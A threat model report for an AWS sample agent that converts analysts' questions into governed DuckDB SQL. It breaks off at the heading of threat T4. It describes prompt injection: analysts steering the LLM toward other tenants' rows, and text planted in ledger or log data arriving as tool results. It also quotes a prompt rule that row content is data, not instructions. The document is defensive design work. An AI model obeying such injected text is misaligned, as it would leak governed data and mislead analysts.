# Comprehensive Threat Model Report

**Generated**: 2026-09-04 23:59:59
**Current Phase**: 9 - Output Generation and Documentation
**Overall Completion**: 100.0%

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Business Context](#business-context)
3. [Classification Profiles](#classification-profiles)
4. [System Architecture](#system-architecture)
5. [Threat Actors](#threat-actors)
6. [Trust Boundaries](#trust-boundaries)
7. [Assets and Flows](#assets-and-flows)
8. [Threats](#threats)
9. [Mitigations](#mitigations)
10. [Assumptions](#assumptions)
11. [Phase Progress](#phase-progress)

## Executive Summary

Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level authorization layer implemented as an engine-neutral sqlglot rewrite in front of the embedded engine, TOTAL AT THE TABLE LEVEL by construction (a restricted principal may reference only tables its policy names, session temp objects it created, or names local to the statement). Two plug-in scenarios: on-chain fund-flow investigation and enterprise cloud-ops (the account's own CUR 2.0 / CloudTrail / CloudWatch Logs exports). Inbound authentication via Amazon Cognito wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role); a streaming SSE entrypoint that binds the session to its principal and emits the per-statement gate->govern->cost->execute trace; and a Streamlit chat UI. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset, a real public OFAC sanctioned-address list, a small SYNTHETIC exchange deposit-label table, and the deployer's own cloud telemetry.

### Key Statistics

- **Total Threats**: 27
- **Total Mitigations**: 24
- **Total Assumptions**: 5
- **System Components**: 9
- **Assets**: 5
- **Threat Actors**: 14

## Business Context

**Description**: Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level authorization layer implemented as an engine-neutral sqlglot rewrite in front of the embedded engine, TOTAL AT THE TABLE LEVEL by construction (a restricted principal may reference only tables its policy names, session temp objects it created, or names local to the statement). Two plug-in scenarios: on-chain fund-flow investigation and enterprise cloud-ops (the account's own CUR 2.0 / CloudTrail / CloudWatch Logs exports). Inbound authentication via Amazon Cognito wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role); a streaming SSE entrypoint that binds the session to its principal and emits the per-statement gate->govern->cost->execute trace; and a Streamlit chat UI. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset, a real public OFAC sanctioned-address list, a small SYNTHETIC exchange deposit-label table, and the deployer's own cloud telemetry.

### Business Features

- **Industry Sector**: Technology
- **Data Sensitivity**: Public
- **User Base Size**: Nano
- **Geographic Scope**: Global / Transboundary
- **Regulatory Requirements**: None
- **System Criticality**: Low
- **Financial Impact**: Negligible
- **Authentication Requirement**: Federated
- **Deployment Model**: Serverless / FaaS
- **User Base Metric**: Installs / downloads
- **Revenue Band**: Enterprise
- **Data Residency**: National / Single-Country
- **Compute Location**: National / Single-Country
- **User Base Location**: Global / Transboundary
- **Organizational HQ**: National / Single-Country

## Classification Profiles

### Software Profile

- **Software Type**: AI / ML System
- **Deployment Model**: Serverless / FaaS
- **Architecture Style**: Serverless
- **Platform / Runtime**: Cloud runtime
- **User Domain**: Financial
- **Licensing / Ownership**: Open source
- **Modern Paradigms**: Agentic AI, Cloud-native
- **Description**: Python 3.11-3.13 on Amazon Bedrock AgentCore Runtime (one microVM per session). Five layers in request order: Scheduling (data_agent/scheduling: claims->role, session binding, SSE), Context (data_agent/context: L0/L1 role-filtered data map, partition-filter cost gate, result shaping, history compression), Governance (data_agent/governance: policies + hardening + sqlglot rewrite, AUTHORIZATION ONLY, fail-closed, table-level deny-by-default), Compute (in-process DuckDB), Storage (S3 durable data). One statement pipeline (Gate->Govern->Cost->Execute) audits once per statement and fails closed on any exception. CI gates: ruff, 303 offline unit tests incl. adversarial authz regressions, bandit, semgrep, detect-secrets.

### Data Asset Profiles

| ID | Name | Asset | Category | Content Types | Sensitivity | Compliance | States | Volume | Lifecycle | Business Domain | Description |
|---|---|---|---|---|---|---|---|---|---|---|---|
| DP001 | Analytical dataset on S3 (4 access paths) | N/A | Structured Data | Non-sensitive / other | Public | N/A | At rest, In transit | Big data | Active | N/A | Parquet/Iceberg tables on S3 reachable via raw glob, S3 Tables, Glue, DuckLake. Public aws-public-blockchain Ethereum data + the deployer's own CUR/CloudTrail/CloudWatch exports. Per-tenant/per-account visibility is enforced by the RLS/CLS rewrite; a table not named in a restricted principal's policy is refused outright (table-level deny-by-default). |
| DP002 | Identity claims (tenant, role, sub) | N/A | API Data | Authentication credentials | Internal | N/A | In transit, In use | N/A | N/A | N/A | Cognito ID-token claims (custom:tenant/custom:role) validated by the AgentCore managed JWT authorizer BEFORE agent code runs; sub binds the session owner. Or identity asserted by a SigV4 caller (local/CLI path). Integrity of these claims is the authorization foundation. |
| DP003 | Governance policy table | N/A | Configuration Data | System metadata | Internal | N/A | At rest, In use | N/A | N/A | N/A | GOVERNANCE_POLICIES JSON: per tenant:role, the tables that role may read (row_filter / deny_columns, {} = readable/no restriction) + allow_raw_paths. Validated at import. Unknown roles resolve to the tenant's most-restricted policy; no policy = deny-all floor. |
| DP004 | Attribution label tables (OFAC + synthetic CEX) | N/A | Structured Data | PII, Non-sensitive / other | Internal | N/A | At rest, In transit | Small | N/A | N/A | ofac_addresses (REAL public OFAC SDN list) and cex_deposit_labels (SYNTHETIC; subject_identity mimics KYC linkage, column-denied to junior and hidden from search_schema discovery for that role). |
| DP005 | Cognito app client secret | N/A | Secrets and Credentials | Authentication credentials | Restricted | N/A | At rest, In use | N/A | N/A | N/A | App client secret for SECRET_HASH during USER_PASSWORD_AUTH; supplied to the UI via env, never committed. |
| DP006 | DuckLake PostgreSQL credentials | N/A | Secrets and Credentials | Authentication credentials | Restricted | N/A | At rest, In use | N/A | N/A | N/A | Optional multi-writer catalog credentials in AWS Secrets Manager, fetched at runtime by the execution role; never in env or code. (PG catalog leg not deployed in the reference config.) |

### User Personas

| ID | Persona | Name | Privilege | Affiliation | Roles | Intent | Entity Type | Authentication | Threat Actor Overlay | In Scope | Description |
|---|---|---|---|---|---|---|---|---|---|---|---|
| UP001 | Authenticated Standard User | End user (investigator / junior analyst) | Low | Customer | End User | Legitimate | Human | Token | N/A | Yes | Logs in at Cognito; ID-token claims carry tenant/role; a restricted principal whose visibility is bounded by RLS/CLS and by table-level deny-by-default. Primary adversary: crafts natural-language questions to steer the LLM into SQL that reaches other tenants' rows, denied columns, or unlisted tables. |
| UP002 | Non-Human Identity / Service Account | Calling application (SigV4) | Elevated | Customer | Integration Endpoint | Legitimate | Non-Human | IAM Role | N/A | Yes | IAM-authenticated infrastructure invoking the runtime on the local/CLI path; trusted to assert its users' identity via header/payload. Unused when the JWT authorizer is configured (the deployed default). Must also use a fresh, unguessable session id per identity (session-binding assumption). |
| UP003 | Developer / DevOps User | Operator (deployer) | Administrative | Customer | Administrator, Developer | Legitimate | Human | IAM Role | N/A | Yes | Customer engineer deploying the sample; owns env config incl. GOVERNANCE_POLICIES, Cognito users, catalog ARNs. Out of scope as an adversary; misconfiguration is in scope. |
| UP004 | Non-Human Identity / Service Account | LLM (Bedrock Claude) | Low | Vendor | Service Account | Compromised | Non-Human | None | N/A | Yes | Generates SQL from natural language; its output executes after the single-statement read-only gate and governance rewrite. Untrusted-input channel: subject to prompt injection via user questions and via data-borne content in query results. |

### Non-Functional Requirements

- **Fail-Safe Behaviour**: Revert to safe state — The governance layer fails closed: a restricted principal never observes rows, columns, or TABLES outside its policy via any of the four access paths. Unparseable SQL, opaque statement shapes, unknown principals (deny-all floor), explicit denied-column selection, a mounted-but-unlisted table, and any exception in the rewrite path result in rejection. Verified by 303 offline tests + a 19-check re-validation on the real code paths (the table-level deny-by-default release).
- **User Error Protection**: Strong — Agent-generated SQL (possibly adversarial via prompt injection) must not write persistently, exfiltrate (COPY TO), attach foreign databases, smuggle a second statement, reach raw file functions as a restricted principal, overwrite a framework result table (reserved-name check on the parsed tree), or degrade the cost gate to a whole-prefix scan (wide/unsatisfiable literal ranges are refused).

## System Architecture

### Components

| ID | Name | Type | Service Provider | Description |
|---|---|---|---|---|
| C001 | Streamlit chat UI | Compute | Other | Chat client: Cognito USER_PASSWORD_AUTH login (app client secret from env), sends the ID token as Bearer over HTTPS to the runtime, parses the SSE envelope stream, renders the interleaved reasoning+tool transcript and a Trace tab. Holds the user's ID token and the app client secret in process memory. |
| C002 | Amazon Cognito user pool | Security | AWS | Identity provider: user pool with custom:tenant/custom:role attributes (READ-only on the app client, so a user cannot self-assign them); app client (with secret) using USER_PASSWORD_AUTH. Issues ID tokens whose aud = app client id. |
| C003 | AgentCore Runtime + inbound JWT authorizer (managed) | Compute | AWS | One microVM per session; hosts the agent process. Managed customJWTAuthorizer validates the Cognito ID token (signature via discovery URL, allowedAudience) BEFORE agent code runs; requestHeaderAllowlist forwards Authorization. Serves the async-generator entrypoint as SSE. Session isolation is per runtimeSessionId (caller-provided). |
| C004 | Scheduling / identity + session binding | Security | Other | Extracts claims in trust order (verified JWT claims -> User-Id header -> payload identity -> deny-all default), resolves role, and BINDS the session to its owner (JWT sub, else tenant:role): on an owner change it resets the engine, result store, data map, L0 injection, audit counters and conversation history before running (T003 fix). Emits typed SSE envelopes. |
| C005 | Strands Agent + Bedrock Claude | Compute | AWS | LLM writes SQL from natural-language questions; reads tool results; emits streaming events. Its SQL output is untrusted input to the pipeline; the prompt states that row content is data, not instructions. |
| C006 | Statement pipeline: Gate -> Govern -> Cost -> Execute | Security | Other | One ordered path for every statement. Gate: single-statement + read-only allowlist + reserved-name check (on the parsed tree). Govern: authorization rewrite (fails closed on ANY exception). Cost: partition-filter gate + path expansion. Execute: under the connection lock. The driver audits exactly once per statement, even on an unexpected exception. |
| C007 | Governance rewrite (authorization) | Security | Other | AuthZ layer: principal->role->policy (unknown role -> tenant's most-restricted; no policy -> deny-all). sqlglot AST rewrite: RLS predicates, schema-aware CLS EXCLUDE, denied-column rejection, raw-path AST-shape allowlist, no local name may shadow a governed table, statement-root allowlist, and TABLE-LEVEL DENY-BY-DEFAULT (a restricted principal may reference only tables its policy names, session temp objects, or local names). Fail-closed. |
| C008 | DuckDB engine (in-process) | Analytics | Other | In-memory embedded OLAP engine; dies with the session; READ_ONLY catalog attaches; resource envelope via memory_limit + spill. Executes only gated+governed single statements under conn_lock serialization. Exposes session_objects() so governance can permit a principal's own temp tables. |
| C009 | CloudWatch Logs | Other | AWS | Runtime logs incl. one EMF audit line per statement (principal, SQL, governance/cost decision, outcome). An optional export of this log group can be mounted as the cw_logs table — readable only by the unrestricted operator role. |

### Connections

| ID | Source | Destination | Protocol | Port | Encrypted | Description |
|---|---|---|---|---|---|---|
| CN001 | Streamlit chat UI (C001) | Amazon Cognito user pool (C002) | HTTPS | 443 | Yes | UI logs the user in (USER_PASSWORD_AUTH + SECRET_HASH); Cognito returns ID/access/refresh tokens. UI keeps the ID token for the bearer header. |
| CN002 | Streamlit chat UI (C001) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | 443 | Yes | UI POSTs {prompt} to /invocations with Authorization: Bearer <ID token> and a session id; consumes the SSE envelope stream. The managed authorizer validates the token before agent code runs. |
| CN003 | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | Scheduling / identity + session binding (C004) | HTTPS | N/A | Yes | Runtime invokes the agent entrypoint with allowlisted headers (JWT already validated) + payload. Scheduling extracts claims and binds the session owner. |
| CN004 | Scheduling / identity + session binding (C004) | Governance rewrite (authorization) (C007) | Other | N/A | Yes | Resolved principal (tenant:role) sets the active role for the session; governance resolves role -> policy (unknown role -> tenant's most restricted; none -> deny-all). |
| CN005 | Scheduling / identity + session binding (C004) | Strands Agent + Bedrock Claude (C005) | Other | N/A | Yes | Scheduling invokes the agent model loop (agent.stream_async) after binding the session and injecting the role-filtered L0 map. |
| CN006 | Strands Agent + Bedrock Claude (C005) | Statement pipeline: Gate -> Govern -> Cost -> Execute (C006) | Other | N/A | Yes | LLM emits SQL via the run_sql tool call; enters the statement pipeline. UNTRUSTED input crossing (prompt-injectable, and influenced by data-borne content). |
| CN007 | Statement pipeline: Gate -> Govern -> Cost -> Execute (C006) | Governance rewrite (authorization) (C007) | Other | N/A | Yes | The Govern stage calls the authorization rewrite (RLS/CLS, raw-path allowlist, table-level deny-by-default, fail-closed on any exception). |
| CN008 | Governance rewrite (authorization) (C007) | DuckDB engine (in-process) (C008) | Other | N/A | Yes | Governed, cost-gated SQL executes on the in-process engine under conn_lock serialization. |
| CN009 | DuckDB engine (in-process) (C008) | S3 analytical data (4 access paths) (D001) | HTTPS | 443 | Yes | Engine reads S3/Iceberg/DuckLake/export data over httpfs with the execution role's scoped read-only credentials (SigV4, TLS). |
| CN010 | DuckDB engine (in-process) (C008) | Label tables on S3 (OFAC + synthetic CEX) (D002) | HTTPS | 443 | Yes | Engine reads the label-table Parquet files (attribution joins) with the same scoped read-only role. |
| CN011 | DuckDB engine (in-process) (C008) | Secrets Manager (DuckLake PG credentials) (D003) | HTTPS | 443 | Yes | Optional: fetch DuckLake PostgreSQL catalog credentials from Secrets Manager at attach time. |
| CN012 | Strands Agent + Bedrock Claude (C005) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | 443 | Yes | Agent model loop calls Amazon Bedrock (Claude) via the runtime's execution role; streaming events flow back through the entrypoint to the SSE channel. |
| CN013 | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | CloudWatch Logs (C009) | HTTPS | 443 | Yes | Runtime/agent logs to CloudWatch incl. one EMF audit line per statement (principal, SQL, governance/cost decision, outcome). |

### Data Stores

| ID | Name | Type | Classification | Encrypted at Rest | Description |
|---|---|---|---|---|---|
| D001 | S3 analytical data (4 access paths) | Object Storage | Public | Yes | Amazon S3 / S3 Tables / Glue / DuckLake: same logical tables via raw glob, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake. Plus the deployer's own CUR/CloudTrail/CloudWatch exports. All attached READ_ONLY. Buckets: SSE, BlockPublicAccess.BLOCK_ALL, enforce_ssl. Source-bucket IAM grant scoped to the CUR prefix and account-pinned CloudTrail prefix (T008 fix). |
| D002 | Label tables on S3 (OFAC + synthetic CEX) | Object Storage | Internal | Yes | ofac_addresses.parquet (real public OFAC SDN list) and cex_deposit_labels.parquet (synthetic; subject_identity is the CLS-protected column) under a validated LABELS_PREFIX on the hardened bucket. |
| D003 | Secrets Manager (DuckLake PG credentials) | Other | Restricted | Yes | AWS Secrets Manager: optional PostgreSQL catalog credentials for the multi-writer DuckLake form; fetched at runtime by the execution role; never in env or code. |

## Threat Actors

### Authenticated restricted analyst (insider)

- **Type**: Insider Threat
- **Motivations**: Financial gain, Revenge / grievance
- **Resources**: Individual
- **Relationship to Target**: Internal
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Targeted
- **Relevant**: Yes
- **Priority**: 1/10
- **Description**: The model's PRIMARY adversary: a legitimately authenticated but restricted analyst (valid Cognito login, restricted tenant:role) who crafts natural-language questions to steer the LLM into SQL that reaches other tenants' rows, denied columns, unlisted tables, or raw file reads. The full authorization surface is aimed at this actor.

### External Attacker

- **Type**: External Attacker
- **Motivations**: Financial gain
- **Resources**: Club / small group
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 1 - Opportunistic / script kiddie
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: Yes
- **Priority**: 2/10
- **Description**: External party probing a deployed sample's public runtime endpoint: forged/absent JWTs, token-audience confusion, or replaying captured bearer tokens.

### Nation-state Actor

- **Type**: Nation-State / APT
- **Motivations**: Espionage / intelligence collection
- **Resources**: Government
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 5 - Nation-state APT / elite
- **State Nexus**: State-executed
- **Targeting Specificity**: Targeted
- **Relevant**: No
- **Description**: A state intelligence or military group operating with advanced capabilities

### Hacktivist

- **Type**: Hacktivist
- **Motivations**: Ideological / hacktivism
- **Resources**: Contest / crowd
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Sector-focused
- **Relevant**: No
- **Description**: An individual or group motivated by ideological or political beliefs

### Organized Crime

- **Type**: Financially Motivated Cybercriminal / Organized Crime
- **Motivations**: Financial gain
- **Resources**: Organization
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 3 - Organized cybercrime
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: No
- **Description**: A criminal organization with significant resources

### Competitor

- **Type**: Competitor / Corporate Espionage
- **Motivations**: Competitive advantage, Espionage / intelligence collection
- **Resources**: Organization
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 3 - Organized cybercrime
- **State Nexus**: None
- **Targeting Specificity**: Targeted
- **Relevant**: No
- **Description**: A business competitor seeking competitive advantage

### Script Kiddie

- **Type**: Script Kiddie / Novice
- **Motivations**: Thrill-seeking / notoriety
- **Resources**: Individual
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 1 - Opportunistic / script kiddie
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: Yes
- **Priority**: 5/10
- **Description**: Opportunistic scanning of exposed demo deployments (default test users with a documented password are provisioned by the CDK — rotating them is the deployer's job).

### Disgruntled Employee

- **Type**: Disgruntled Employee
- **Motivations**: Revenge / grievance
- **Resources**: Individual
- **Relationship to Target**: Internal
- **Sophistication Tier**: Tier 1 - Opportunistic / script kiddie
- **State Nexus**: None
- **Targeting Specificity**: Targeted
- **Relevant**: No
- **Description**: A current or former employee with a grievance

### Operator (misconfiguration)

- **Type**: Privileged User
- **Motivations**: Financial gain
- **Resources**: Individual
- **Relationship to Target**: Internal
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Targeted
- **Relevant**: Yes
- **Priority**: 4/10
- **Description**: Operator error as an unintentional threat: malformed GOVERNANCE_POLICIES, a policy that omits a mounted table, deploying without the JWT authorizer, or leaking the app client secret. Policy JSON is validated at import; omission now fails closed (deny-by-default).

### Compromised calling application (SigV4 path)

- **Type**: Third Party
- **Motivations**: Financial gain
- **Resources**: Organization
- **Relationship to Target**: Partner / third-party
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: Yes
- **Priority**: 3/10
- **Description**: A compromised/careless IAM-authenticated caller on the local/CLI SigV4 path able to assert arbitrary tenant:role via header/payload, OR to reuse a runtimeSessionId across identities. Documented trust assumption; unreachable under the deployed JWT authorizer, and the session-owner binding resets state on an identity change.

### Terrorist Organization

- **Type**: Terrorist Organization
- **Motivations**: Ideological / hacktivism, Disruption / destruction
- **Resources**: Club / small group
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Sector-focused
- **Relevant**: No
- **Description**: A group with limited offensive cyber capability, primarily using the internet for propaganda and recruitment

### Private Sector Offensive Actor

- **Type**: Private Sector Offensive Actor / Cyber Mercenary
- **Motivations**: Financial gain
- **Resources**: Organization
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 4 - State-nexus / advanced
- **State Nexus**: State-aligned
- **Targeting Specificity**: Targeted
- **Relevant**: No
- **Description**: A commercial vendor developing zero-day exploits and spyware for client-selected targets

### Data-borne prompt injector

- **Type**: Other
- **Motivations**: Financial gain, Disruption / destruction
- **Resources**: Individual
- **Relationship to Target**: External
- **Sophistication Tier**: Tier 2 - Hacktivist / campaign-driven
- **State Nexus**: None
- **Targeting Specificity**: Opportunistic
- **Relevant**: Yes
- **Priority**: 6/10
- **Description**: Cannot authenticate to the agent, but writes text an analyst's query will select: token names / contract data / log payloads on the public ledger, or attacker-influenceable CloudTrail fields. The text arrives in the model's context as a tool result and may steer the next turn. Governance still bounds data access; the risk is a fabricated narrative.

### Compromised upstream supplier (supply chain)

- **Type**: Third Party
- **Motivations**: Espionage / intelligence collection, Financial gain
- **Resources**: Organization
- **Relationship to Target**: Partner / third-party
- **Sophistication Tier**: Tier 4 - State-nexus / advanced
- **State Nexus**: State-aligned
- **Targeting Specificity**: Opportunistic
- **Relevant**: Yes
- **Priority**: 7/10
- **Description**: Serves a malicious DuckDB extension build (installed at cold start unless pre-baked) or ships a malicious release of duckdb / sqlglot / strands / bedrock-agentcore. Code inside the agent process bypasses every SQL-layer control. Low likelihood (signed extensions, HTTPS), high consequence.

## Trust Boundaries

### Trust Zones

#### Client side (UI + end user + LLM output)

- **Trust Level**: Untrusted
- **Architecture Nodes**: Streamlit chat UI (C001), Strands Agent + Bedrock Claude (C005)
- **Description**: The Streamlit UI on the analyst's machine (holds the ID token + app client secret) and the LLM whose SQL output is attacker-influenceable via prompt injection and data-borne content.

#### AWS managed platform

- **Trust Level**: High
- **Architecture Nodes**: Amazon Cognito user pool (C002), AgentCore Runtime + inbound JWT authorizer (managed) (C003), CloudWatch Logs (C009)
- **Description**: Cognito (token issuance, custom claims read-only on the client), AgentCore Runtime + managed JWT authorizer (microVM isolation, pre-code token validation), Bedrock, CloudWatch. AWS-operated; trusted per the shared-responsibility model.

#### Agent process (sample code)

- **Trust Level**: Medium
- **Architecture Nodes**: Scheduling / identity + session binding (C004), Statement pipeline: Gate -> Govern -> Cost -> Execute (C006), Governance rewrite (authorization) (C007), DuckDB engine (in-process) (C008)
- **Description**: The session's microVM process: scheduling/session-binding, the statement pipeline, the governance rewrite, the in-process DuckDB. Executes untrusted SQL under layered controls; one session = one principal = one engine, rebound and reset on an owner change.

#### Customer account data plane

- **Trust Level**: High
- **Architecture Nodes**: S3 analytical data (4 access paths) (D001), Label tables on S3 (OFAC + synthetic CEX) (D002), Secrets Manager (DuckLake PG credentials) (D003)
- **Description**: S3 buckets/catalogs (analytical data, exports, label tables) and Secrets Manager in the customer's own account, reached only via the scoped read-only execution role.

### Trust Boundaries

#### Inbound AuthN edge (Cognito + managed authorizer)

- **Type**: Network
- **Controls**: Cognito user pool AuthN (USER_PASSWORD_AUTH + SECRET_HASH), AgentCore customJWTAuthorizer: signature via discovery URL + allowedAudience, BEFORE agent code, requestHeaderAllowlist limits forwarded headers to Authorization, TLS on all calls
- **Description**: The deployed sample's real authentication perimeter: only requests carrying a valid Cognito ID token for the configured audience reach a runtime session. Verified: no-token=401, forged-token=403, both pre-code.

#### Platform -> agent identity handoff

- **Type**: Virtual Machine
- **Controls**: Managed authorizer verifies before agent code, claims normalization custom:tenant/custom:role -> tenant:role, trust-ordered fallback chain with deny-all floor, unknown role -> tenant's MOST restricted policy, session-owner binding: state reset on an owner change (T003)
- **Description**: Verified identity crosses from the managed authorizer into agent code as claims. The session is bound to its owner; a different identity on a reused session id resets the engine, results, history and counters.

#### Untrusted model <-> agent controls

- **Type**: Process
- **Controls**: single-statement rule via duckdb.extract_statements, read-only statement allowlist + reserved-name check on the parsed tree, governance rewrite: RLS guarded subqueries, schema-aware CLS EXCLUDE, denied-column rejection, raw-path AST-shape allowlist, statement-root allowlist, local-name shadow refusal, TABLE-LEVEL DENY-BY-DEFAULT, cost gate: partition filter + bounded path expansion, fail-closed on any rewrite exception; every statement audited once, prompt rule: row content is data, not instructions
- **Description**: The prompt goes to the model and the model's SQL comes back (attacker-influenceable via prompt injection AND data-borne content). THE central boundary of this model. All controls covered by 303 offline tests + a 19-check re-validation on the real code paths.

#### Agent -> customer data plane

- **Type**: Account
- **Controls**: scoped read-only IAM execution role (source-bucket grant pinned to CUR + account-scoped CloudTrail prefixes), READ_ONLY catalog attaches, TLS in transit, SSE + BlockPublicAccess + enforce_ssl on buckets, aws:SourceArn on the CloudWatch Logs export bucket policy, Secrets Manager for PG credentials
- **Description**: Engine reads S3/catalog/label/secret data with the scoped read-only execution role over TLS. Only governed SQL output flows back; the account pin is now an IAM boundary, not just a row filter.

## Assets and Flows

### Assets

| ID | Name | Type | Classification | Lifecycle | Data States | Criticality | Owner |
|---|---|---|---|---|---|---|---|
| A001 | Governed analytical rows/columns | Data | Internal | N/A | At rest, In transit, In use | 4 | N/A |
| A002 | Cognito ID token (tenant/role claims) | Token | Confidential | N/A | In transit, In use | 5 | N/A |
| A003 | Cognito app client secret | Credential | Restricted | N/A | At rest, In use | 3 | N/A |
| A004 | GOVERNANCE_POLICIES configuration | Configuration | Internal | N/A | At rest, In use | 4 | N/A |
| A005 | Agent-generated SQL (untrusted) | Data | Internal | N/A | In transit, In use | 4 | N/A |

### Asset Flows

| ID | Asset | Source | Destination | Protocol | Encrypted | Risk Level |
|---|---|---|---|---|---|---|
| F001 | Cognito ID token (tenant/role claims) | Amazon Cognito user pool (C002) | Streamlit chat UI (C001) | HTTPS | Yes | N/A |
| F002 | Cognito ID token (tenant/role claims) | Streamlit chat UI (C001) | AgentCore Runtime + inbound JWT authorizer (managed) (C003) | HTTPS | Yes | N/A |
| F003 | Cognito app client secret | Streamlit chat UI (C001) | Amazon Cognito user pool (C002) | HTTPS | Yes | N/A |
| F004 | Agent-generated SQL (untrusted) | Strands Agent + Bedrock Claude (C005) | Statement pipeline: Gate -> Govern -> Cost -> Execute (C006) | N/A | Yes | 4 |
| F005 | GOVERNANCE_POLICIES configuration | Scheduling / identity + session binding (C004) | Governance rewrite (authorization) (C007) | N/A | No | N/A |
| F006 | Governed analytical rows/columns | S3 analytical data (4 access paths) (D001) | DuckDB engine (in-process) (C008) | HTTPS | Yes | N/A |
| F007 | Governed analytical rows/columns | DuckDB engine (in-process) (C008) | Streamlit chat UI (C001) | HTTPS | Yes | 3 |

## Threats

### Resolved Threats

#### T1: Authenticated restricted analyst (any persona that is not deny-all)

**Statement**: A Authenticated restricted analyst (any persona that is not deny-all) A policy that governs at least one table, plus any OTHER table mounted by an enabled scenario that this policy does not name. Both shipped scenarios mounted together is the default configuration. can asks an ordinary question that reaches a mounted table the policy never mentions; the rewrite guarded only NAMED tables, so an unlisted one had no guard., which leads to the full contents of that table are returned. Was reproduced against the shipped defaults: ops:secops read cex_deposit_labels incl. subject_identity; ops:finops read CloudTrail source IPs; a junior

- **Prerequisites**: A policy that governs at least one table, plus any OTHER table mounted by an enabled scenario that this policy does not name. Both shipped scenarios mounted together is the default configuration.
- **Action**: asks an ordinary question that reaches a mounted table the policy never mentions; the rewrite guarded only NAMED tables, so an unlisted one had no guard.
- **Impact**: the full contents of that table are returned. Was reproduced against the shipped defaults: ops:secops read cex_deposit_labels incl. subject_identity; ops:finops read CloudTrail source IPs; a junior
- **Impacted Assets**: A001, A004
- **Tags**: governance-completeness, table-level-default-allow, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: Table-level deny-by-default refuses any mounted-but-unlisted table for restricted principals across all four access paths; personas list their readable tables; L0/search are role-filtered. Verified live (verify3) and by 303 offline tests. Residual: a semantically over-broad policy an operator authors is T011.
- **Assessment State**: Current

#### T2: Authenticated restricted analyst with any ops persona

**Statement**: A Authenticated restricted analyst with any ops persona The cloud-ops scenario deployed with the CloudWatch Logs export of the runtime's own log group curated into the cw_logs table (the documented setup). can queries cw_logs, whose rows are the agent's own EMF audit lines., which leads to reconstructs other principals' activity: their role, their verbatim SQL (with the addresses/account ids they investigated), and the RLS/CLS applied to them.

- **Prerequisites**: The cloud-ops scenario deployed with the CloudWatch Logs export of the runtime's own log group curated into the cw_logs table (the documented setup).
- **Action**: queries cw_logs, whose rows are the agent's own EMF audit lines.
- **Impact**: reconstructs other principals' activity: their role, their verbatim SQL (with the addresses/account ids they investigated), and the RLS/CLS applied to them.
- **Impacted Assets**: A004
- **Tags**: audit-as-data, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: cw_logs is named by no persona, so it is unreadable except to the unrestricted operator role, and documented as part of the governance boundary. Follows from deny-by-default.
- **Assessment State**: Current

#### T3: Malicious client, careless integrator, or the SigV4 calling application

**Statement**: A Malicious client, careless integrator, or the SigV4 calling application Two identities presenting the SAME runtimeSessionId (an integrator deriving session ids from something predictable, a reused id, or a leaked one). AgentCore isolates by session id. can invokes with another principal's session id; the engine, result store, conversation history and audit counters are module-level and lived for the microVM, and nothing re-bound or reset them., which leads to a lower-privileged principal reads governed OUTPUT produced under a higher-privileged policy, plus the prior conversation. Reproduced: a junior counted an admin-materialized _r_1 in full.

- **Prerequisites**: Two identities presenting the SAME runtimeSessionId (an integrator deriving session ids from something predictable, a reused id, or a leaked one). AgentCore isolates by session id.
- **Action**: invokes with another principal's session id; the engine, result store, conversation history and audit counters are module-level and lived for the microVM, and nothing re-bound or reset them.
- **Impact**: a lower-privileged principal reads governed OUTPUT produced under a higher-privileged policy, plus the prior conversation. Reproduced: a junior counted an admin-materialized _r_1 in full.
- **Impacted Assets**: A001, A005
- **Tags**: session-binding, fixed
- **Residual Risk Decision**: Mitigated
- **Residual Severity**: Low
- **Residual Likelihood**: Unlikely
- **Residual Risk Rationale**: The session is bound to its owner and all retained state is reset on an owner change; verified a junior cannot read an admin-materialized result after the rebind. Residual rests on AgentCore's per-session microVM isolation.
- **Assessment State**: Current

#### T4: Authenticated restricted analyst, or the model on an ordinary question

